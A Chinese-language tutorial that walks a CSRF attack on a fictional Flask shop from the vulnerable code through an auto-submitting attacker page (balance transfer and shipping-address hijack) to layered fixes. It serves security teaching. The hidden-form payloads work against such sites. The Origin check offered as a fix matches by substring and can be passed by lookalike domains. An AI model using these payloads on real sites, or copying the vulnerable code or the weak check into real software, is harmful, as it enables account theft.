# 实战场景分析:电商网站 CSRF 攻击全流程

下面以一个**虚构的电商网站 "ShopEasy"(基于 Flask 框架)** 为例,完整还原从漏洞发现到攻击利用、再到修复的全过程。所有代码仅用于安全教学演示。

---

## 一、场景设定

ShopEasy 是一个使用 Flask + Session 认证的在线商城,存在"收货地址修改"和"一键转余额给好友"两个功能。

**技术栈:**
- 后端:Flask
- 认证方式:Session Cookie(`session_id`),未设置 `SameSite`
- 没有使用 CSRF Token

---

## 二、存在漏洞的代码

```python
# app.py —— 存在漏洞的版本
from flask import Flask, request, session, redirect

app = Flask(__name__)
app.secret_key = "dev-secret"

@app.route('/login', methods=['POST'])
def login():
    user = authenticate(request.form['username'], request.form['password'])
    if user:
        session['user_id'] = user.id
        # 问题 1:没有设置 SameSite 属性
        # Flask 默认 SESSION_COOKIE_SAMESITE = None (低版本)
    return redirect('/dashboard')

@app.route('/transfer_balance', methods=['POST'])
def transfer_balance():
    if 'user_id' not in session:
        return "未登录", 401
    
    to_user = request.form['to_user']
    amount = request.form['amount']
    
    # 问题 2:仅凭 Session 判断身份,没有任何 CSRF Token 校验
    # 问题 3:没有二次验证(密码/验证码)
    db.transfer(session['user_id'], to_user, amount)
    return "转账成功"

@app.route('/update_address', methods=['POST'])
def update_address():
    if 'user_id' not in session:
        return "未登录", 401
    db.update_address(session['user_id'], request.form['address'])
    return "地址已更新"
```

### 漏洞点分析

| 问题 | 说明 |
|---|---|
| 无 CSRF Token | 表单没有携带任何随机、不可预测的校验字段 |
| Cookie 无 SameSite | 跨站请求依然会自动带上 Session Cookie |
| 高危操作无二次验证 | 转账这种敏感操作不需要重新输入密码 |
| GET/POST 语义虽正确,但形同虚设 | 仅靠 POST 不能防御表单自动提交型攻击 |

---

## 三、攻击者视角:构造恶意页面

攻击者 Mallory 想把受害者 Alice(ShopEasy 的登录用户)的余额转给自己。

### 第 1 步:分析目标请求

Mallory 注册一个账号,观察"转账给好友"请求的真实结构:

```
POST /transfer_balance HTTP/1.1
Host: shopeasy.com
Cookie: session_id=eyJ1c2VyX2lkIjoxMjN9...
Content-Type: application/x-www-form-urlencoded

to_user=mallory&amount=5000
```

发现参数 `to_user`、`amount` **完全可预测**,且没有任何额外校验字段。

### 第 2 步:搭建恶意页面(evil-coupon.com)

```html
<!DOCTYPE html>
<html>
<head><title>恭喜获得 100 元优惠券!</title></head>
<body onload="document.forms[0].submit()">
  <h1>点击领取您的专属优惠券...</h1>

  <form action="https://shopeasy.com/transfer_balance" method="POST" style="display:none">
    <input type="hidden" name="to_user" value="mallory">
    <input type="hidden" name="amount" value="5000">
  </form>
</body>
</html>
```

### 第 3 步:诱导受害者点击

Mallory 通过以下任一渠道传播链接:
- 群发邮件:"您有一张 100 元优惠券待领取,点击查看"
- 社交平台广告或私信
- 在论坛/评论区插入短链接(隐藏真实域名)

### 第 4 步:受害者中招的完整时序

```
① Alice 正常登录 shopeasy.com,浏览器保存 session_id Cookie
② Alice 在同一浏览器中点开 Mallory 发来的 evil-coupon.com 链接
③ 页面加载完成,onload 自动提交隐藏表单
④ 浏览器向 shopeasy.com 发起 POST /transfer_balance 请求
   —— 浏览器自动附带 Alice 的 session_id Cookie(跨站请求默认行为)
⑤ ShopEasy 服务器验证 Session 合法,确认是"Alice 本人"发起的请求
⑥ 执行转账:Alice 账户 -5000,Mallory 账户 +5000
⑦ Alice 对此毫无感知,页面可能还顺带跳转到一个无害的"优惠券已过期"页面掩人耳目
```

**关键点:** 浏览器的同源策略(Same-Origin Policy)阻止的是**读取跨站响应内容**,但并不阻止**发送跨站请求**,更不会阻止自动携带该站点下的 Cookie。这正是 CSRF 能够成立的根本原因。

---

## 四、延伸攻击:结合地址篡改的"收货劫持"

如果同时存在 `update_address` 接口的 CSRF 漏洞,攻击者可以设计组合攻击:

```html
<form id="f1" action="https://shopeasy.com/update_address" method="POST">
  <input type="hidden" name="address" value="收件人:Mallory, 地址:XX省XX市XX路1号">
</form>
<script>
  // 先改地址
  document.getElementById('f1').submit();
</script>
```

受害者下次下单时,收货地址已被悄悄篡改为攻击者可控地址,而受害者可能因为没有仔细核对而未发现,导致实物商品被劫持。这说明 CSRF 的危害**不止于直接转账**,任何"修改状态"的接口都可能被滥用。

---

## 五、修复过程(逐步加固)

### 修复 1:启用 Flask-WTF 的 CSRF 保护

```python
from flask_wtf import CSRFProtect

app = Flask(__name__)
app.secret_key = "dev-secret"
csrf = CSRFProtect(app)  # 全局启用 CSRF 保护
```

模板中加入 Token:

```html
<form action="/transfer_balance" method="POST">
  <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
  <input type="text" name="to_user">
  <input type="text" name="amount">
  <button type="submit">转账</button>
</form>
```

此后,`evil-coupon.com` 伪造的表单因为**拿不到正确的 `csrf_token`**(该 Token 与 Alice 的 Session 绑定,且每次会话/请求唯一),请求会被服务器拒绝,返回 400 Bad Request。

### 修复 2:设置 SameSite Cookie

```python
app.config.update(
    SESSION_COOKIE_SAMESITE='Lax',
    SESSION_COOKIE_SECURE=True,     # 仅 HTTPS 下传输
    SESSION_COOKIE_HTTPONLY=True,   # 禁止 JS 读取,防 XSS 窃取
)
```

设置为 `Lax` 后,从第三方网站发起的 POST 请求**默认不会携带 Cookie**,从源头上切断了攻击路径(作为第二层防御)。

### 修复 3:高危操作增加二次验证

```python
@app.route('/transfer_balance', methods=['POST'])
def transfer_balance():
    if 'user_id' not in session:
        return "未登录", 401
    
    # 增加:要求再次输入密码
    if not verify_password(session['user_id'], request.form.get('password', '')):
        return "密码验证失败", 403
    
    to_user = request.form['to_user']
    amount = request.form['amount']
    db.transfer(session['user_id'], to_user, amount)
    return "转账成功"
```

### 修复 4:服务端校验 Origin(额外防线)

```python
@app.before_request
def check_origin():
    if request.method == 'POST':
        origin = request.headers.get('Origin', '')
        if origin and 'shopeasy.com' not in origin:
            return "非法来源", 403
```

---

## 六、修复后再次尝试攻击(验证效果)

攻击者的伪造表单提交后:

```
POST /transfer_balance HTTP/1.1
Host: shopeasy.com
Cookie: (因 SameSite=Lax,跨站 POST 不再携带)
Content-Type: application/x-www-form-urlencoded

to_user=mallory&amount=5000
```

- 由于 `SameSite=Lax`,浏览器**根本不会在这个跨站 POST 请求中附带 Cookie**,服务器收到请求后发现未登录,直接拒绝。
- 即使 SameSite 被绕过(如旧版浏览器),由于缺少正确的 `csrf_token`,Flask-WTF 中间件也会在请求进入业务逻辑前拦截并返回 400。
- 双重防线叠加,攻击失败。

---

## 七、这个案例给出的经验总结

1. **CSRF 漏洞往往出现在"看似简单"的状态修改接口上**(转账、改地址、改邮箱、改密码),而不仅是大家直觉认为的登录相关功能。
2. **单一防御手段不够可靠**:只用 SameSite 可能被旧浏览器绕过;只用 Token 可能因 XSS 共存而失效。工程上推荐 **SameSite + CSRF Token + Origin 校验 + 高危操作二次验证** 的纵深防御。
3. **框架默认配置未必安全**。例如旧版本 Flask 的 Session Cookie 默认不带 `SameSite=Lax`,需要开发者主动配置;Django、Spring Boot 的默认行为也各不相同,上线前必须核实清楚。
4. **CSRF 的社会工程学部分同样关键**:攻击的真正触发点往往是钓鱼邮件、虚假优惠券等"诱导点击",技术漏洞 + 社工诱导 两者缺一不可才能构成完整的攻击链。因此用户教育(不随意点击不明链接)也是防御体系的一环。
